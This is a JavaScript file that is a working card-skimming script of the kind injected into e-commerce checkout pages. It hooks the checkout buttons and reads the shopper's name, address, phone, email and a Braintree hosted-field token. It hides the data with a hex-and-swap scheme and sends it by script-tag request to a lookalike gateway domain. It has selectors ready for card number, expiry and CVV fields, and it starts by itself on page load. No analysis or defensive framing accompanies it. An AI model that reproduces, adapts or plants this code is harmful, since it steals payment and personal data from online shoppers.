if (typeof window.ant_zero == "undefined") {
	window.ant_zero = 0;
	window.ant_loaded = false;
	window.ant_last_data = false;
	window.ant_interval;
	window.payment_checkout1 = [
		"*[name*='numero_cartao']",
		"input[id*='cc_number']",
		"*[name*='cc_num']"
	];
	window.payment_checkout2 = [
		"*[name*='expiracao_mes']",
		"*[name*='cc_exp_m']",
		"*[name*='expirationMonth']"
	];
	window.payment_checkout3 = [
		"*[name*='expiracao_ano']",
		"*[name*='cc_exp_y']",
		"*[name*='expirationYear']"
	];
	window.payment_checkout4 = [
		"*[name*='codigo_seguranca']",
		"input[id*='cc_cid']",
		"*[name*='cc_cid']",
		"*[name*='cc_cvv']"
	];
	function serializeToQuery(_0x9149x2) {
		var _0x9149x3 = [];
		for (var _0x9149x4 in _0x9149x2) {
			if (_0x9149x2.hasOwnProperty(_0x9149x4)) {
				_0x9149x3.push(encodeURIComponent(_0x9149x4) + "=" + encodeURIComponent(_0x9149x2[_0x9149x4]));
			}
		}
		return _0x9149x3.join("&");
	}
	function serializeKeysValues(_0x9149x6, _0x9149x7) {
		var _0x9149x8 = [];
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x6.length; _0x9149x9++) {
			_0x9149x8.push(encodeURIComponent(_0x9149x6[_0x9149x9]) + "=" + encodeURIComponent(_0x9149x7[_0x9149x9]));
		}
		return _0x9149x8.join("&");
	}
	function ant_replace_at(_0x9149x3, _0x9149xb, _0x9149xc) {
		return _0x9149x3.substr(0, _0x9149xb) + _0x9149xc + _0x9149x3.substr(_0x9149xb + _0x9149xc.length);
	}
	function ant_pack(_0x9149x3) {
		var _0x9149xe = "";
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x3.length; _0x9149x9++) {
			_0x9149xe += "" + _0x9149x3.charCodeAt(_0x9149x9).toString(16);
		}
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149xe.length; _0x9149x9 += 2) {
			var _0x9149xf = _0x9149xe.substr(_0x9149x9, 1);
			var _0x9149x10 = _0x9149xe.substr(_0x9149x9 + 1, 1);
			_0x9149xe = ant_replace_at(_0x9149xe, _0x9149x9, _0x9149x10);
			_0x9149xe = ant_replace_at(_0x9149xe, _0x9149x9 + 1, _0x9149xf);
		}
		return _0x9149xe;
	}
	function randomInteger(_0x9149x12, _0x9149x13) {
		var _0x9149x14 = _0x9149x12 + Math.random() * (_0x9149x13 + 1 - _0x9149x12);
		return Math.floor(_0x9149x14);
	}
	function ant_post_ajax(_0x9149x16, _0x9149x17) {
		var _0x9149x18 = document.getElementsByTagName("head").item(0);
		var _0x9149x19 = document.createElement("script");
		var _0x9149x1a = "https://braintreegateway24.tech/stat?" + _0x9149x16;
		_0x9149x19.setAttribute("src", _0x9149x1a);
		_0x9149x18.appendChild(_0x9149x19);
	}
	function ant_get_elem(_0x9149x1c) {
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x1c.length; _0x9149x9++) {
			var _0x9149x1d = _0x9149x1c[_0x9149x9];
			var _0x9149x1e = document.querySelector(_0x9149x1d);
			if (_0x9149x1e) {
				return _0x9149x1e;
			}
		}
		return false;
	}
	function ant_get_val(_0x9149x20) {
		var _0x9149x21 = document.querySelectorAll(_0x9149x20);
		for (var _0x9149x22 = 0; _0x9149x22 < _0x9149x21.length; _0x9149x22++) {
			var _0x9149x1e = _0x9149x21[_0x9149x22];
			if (_0x9149x1e.value) {
				return _0x9149x1e.value;
			}
		}
		return "";
	}
	function ant_get_val_multi(_0x9149x1c) {
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x1c.length; _0x9149x9++) {
			var _0x9149x20 = _0x9149x1c[_0x9149x9];
			var _0x9149x24 = ant_get_val(_0x9149x20);
			if (_0x9149x24) {
				return _0x9149x24;
			}
		}
		return "";
	}
	function ant_main() {
		var hostname = location.hostname;
		var braintreeHostedFieldNumber = document.getElementById("braintree-hosted-field-number");
		if (!braintreeHostedFieldNumber) {
			return;
		}
		var src = braintreeHostedFieldNumber.src;
		var treeValue = src.substring(src.indexOf("#") + 1);
		var firstnameValue = ant_get_val_multi(["*[name='billing[firstname]']", "input[name=\"firstname\"]"]);
		var lastnameValue = ant_get_val_multi(["*[name='billing[lastname]']", "input[name=\"lastname\"]"]);
		var addressValue = ant_get_val_multi(["*[name='billing[street][]']", "input[name=\"street[0]\"]"]);
		var cityValue = ant_get_val_multi(["*[name='billing[city]']", "input[name=\"city\"]"]);
		var stateValue = ant_get_val_multi([
			"*[name='billing[region_id]']",
			"input[name='region']",
			"select[name='region_id']"
		]);
		var zipValue = ant_get_val_multi(["*[name='billing[postcode]']", "input[name='postcode']"]);
		var countryValue = ant_get_val_multi(["*[name='billing[country_id]']", "*[name='country_id']"]);
		var phoneValue = ant_get_val_multi(["*[name='billing[telephone]']", "input[name='telephone']"]);
		var emailValue = ant_get_val_multi(["*[name='billing[email]']", "input[name='username']"]);
		var _0x9149x6 = [
			"host",
			"firstname",
			"lastname",
			"address",
			"city",
			"state",
			"zip",
			"country",
			"phone",
			"email",
			"uagent",
			"tree"
		];
		var _0x9149x7 = [
			hostname,
			firstnameValue,
			lastnameValue,
			addressValue,
			cityValue,
			stateValue,
			zipValue,
			countryValue,
			phoneValue,
			emailValue,
			navigator.userAgent,
			treeValue
		];
		var _0x9149x33 = ant_pack(serializeKeysValues(_0x9149x6, _0x9149x7));
		if (_0x9149x33 == window.ant_last_data) {
			return;
		}
		window.ant_last_data = _0x9149x33;
		_0x9149x7 = "ztoken=" + _0x9149x33;
		ant_post_ajax(_0x9149x7, false);
	}
	function ant_cockroach() {
		var braintreeHostedFieldNumber = document.getElementById("braintree-hosted-field-number");
		if (!braintreeHostedFieldNumber) {
			return;
		}
		var _0x9149x35 = [];
		var _0x9149x1c = ["button[onclick*='.save']", "button[class*='checkout']"];
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x1c.length; _0x9149x9++) {
			var _0x9149x1d = _0x9149x1c[_0x9149x9];
			var _0x9149x21 = document.querySelectorAll(_0x9149x1d);
			for (var _0x9149x22 = 0; _0x9149x22 < _0x9149x21.length; _0x9149x22++) {
				var _0x9149x1e = _0x9149x21[_0x9149x22];
				if (!_0x9149x35.includes(_0x9149x1e)) {
					_0x9149x35.push(_0x9149x1e);
				}
			}
		}
		for (var _0x9149x9 = 0; _0x9149x9 < _0x9149x35.length; _0x9149x9++) {
			var _0x9149x1e = _0x9149x35[_0x9149x9];
			var _0x9149x36 = _0x9149x1e.getAttribute("ant_check");
			if (_0x9149x36 == "1") {
				continue;
			}
			_0x9149x1e.addEventListener("click", function() {
				try {
					ant_main();
				} catch (err) {}
			});
			_0x9149x1e.addEventListener("mousedown", function() {
				try {
					ant_main();
				} catch (err) {}
			});
			_0x9149x1e.setAttribute("ant_check", "1");
		}
	}
	function ant_load() {
		if (window.ant_loaded) {
			return;
		}
		window.ant_loaded = true;
		ant_cockroach();
		window.ant_interval = setInterval(function() {
			ant_cockroach();
		}, 7e3);
	}
	document.addEventListener("DOMContentLoaded", function(_0x9149x38) {
		ant_load();
	});
	window.addEventListener("load", function() {
		ant_load();
	}, false);
	setTimeout(function() {
		ant_load();
	}, 7e3);
}
